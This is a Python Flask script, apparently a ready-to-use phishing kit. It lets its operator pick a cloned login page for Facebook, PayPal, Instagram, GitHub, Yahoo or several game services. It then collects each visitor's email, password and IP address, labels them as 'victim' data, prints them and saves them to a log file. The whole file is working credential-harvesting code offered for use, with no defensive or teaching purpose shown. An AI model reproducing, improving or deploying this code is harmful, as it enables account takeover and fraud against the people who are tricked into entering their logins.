from flask import Flask ,request ,render_template
import socket , os , time
##########
os.system("clear")
time.sleep(1)
print ("\033[1;31m_____ _     _     _")
print ("\033[1;31m|  ___(_)___| |__ (_)_ __   __ _")
print ("\033[0;31m| |_  | / __| '_ \| | '_ \ / _` |")
print ("\033[0;32m|  _| | \__ \ | | | | | | | (_| |")
print ("\033[1;33m|_|   |_|___/_| |_|_|_| |_|\__, |")
print ("\033[0;32m                           |___/")
print ("\n                   \033[0;31m[\033[0;36mBY \033[0;31m: \033[0;36mahmed eldeek\033[0;31m]")
print ("")
print ("\033[0;31m\033[1;31mpages :")
print ("\033[0;34m\033[0;34m[1] Facebook")
print ("\033[0;34m\033[0;34m[2] Pupg")
print ("\033[0;34m\033[0;34m[3] Instgram")
print ("\033[0;34m\033[0;34m[4] clash")
print ("\033[0;34m\033[0;34m[5] Paypal")
print ("\033[0;34m\033[0;34m[6] Yahoo")
print ("\033[0;34m\033[0;34m[7] Githup")
cho = int ((input ("\033[1;33menter numper page >> ")))
time.sleep(0.500)
os.system("clear")
################
app = Flask(__name__)
@app.route('/' , methods=['POST','GET'])
def web_page():
    username = request.args.get('email')
    password = request.args.get('pass')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    print ("\033[0;31m########################################################################")
    print ("\033[0;31m[\033[0;37m~\033[0;31m]"+"\033[0;33m  ip victem : \033[0;32m" + ip)
    print ("\033[0;31m[\033[0;37m~\033[0;31m] " , "\033[0;33memail victem :\033[0;32m" , (username))
    print ("\033[0;31m[\033[0;37m~\033[0;31m] " , "\033[0;33mpassword victem :\033[0;32m" , (password))
    print ("\033[0;31m########################################################################")
    with open ("log.txt" , "w") as f :
    	f.write("\nemail victim : " + str (username))
    	f.write ("\npassword victim : " + str(password))
    	f.write("\nip victim : " + str(ip))
    if username == "None" :
    	pass
    if password == "None" :
    	pass
    return render_template(str(cho)+'.html')
def get_user_ip () :
                try :
                        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                        s.connect(("8.8.8.8" , 80))
                        ip = s.getsockname()[0]
                        s.close()
                        return ip
                except OSError :
                        return"localhost"
if __name__ == '__main__'  :
	app.run(host=get_user_ip())
